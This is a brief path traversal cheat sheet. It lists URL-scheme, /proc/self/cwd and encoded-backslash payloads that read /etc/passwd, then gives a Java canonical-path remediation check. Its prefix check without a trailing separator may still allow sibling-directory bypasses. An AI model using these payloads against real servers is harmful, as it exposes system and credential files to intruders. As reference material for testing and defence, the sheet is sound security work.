Path Traversal
==============


## Schemas to read files

```
file:///etc/passwd
netdoc:///etc/passwd (Java)
jar:///etc/passwd
dict:///etc/passwd
gopher:///etc/passwd
ldap:///etc/passwd
```


## Fake current working directory

This is a symbolic link to the current working directory of the process:

```
file:///proc/self/cwd/
```


## Path Traversal on HTTP path

```http
https://{HOST}/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd
```


## Remediation

### Java

Before using the `path` and `filename` variables from the user inputs, the application
has to verify the targeted file belongs in the correct directory `DIRECTORY_BASE_PATH`:

```java
// the use controls `path` and `filename`, so he can set the path to something bad
File file = new File(DIRECTORY_BASE_PATH, path + filename);

// we check if the canonical path on the disk match the `DIRECTORY_BASE_PATH`
if (file.getCanonicalPath().startsWith(DIRECTORY_BASE_PATH)) {
    // The file is in the correct directory, we can process it!
}
```
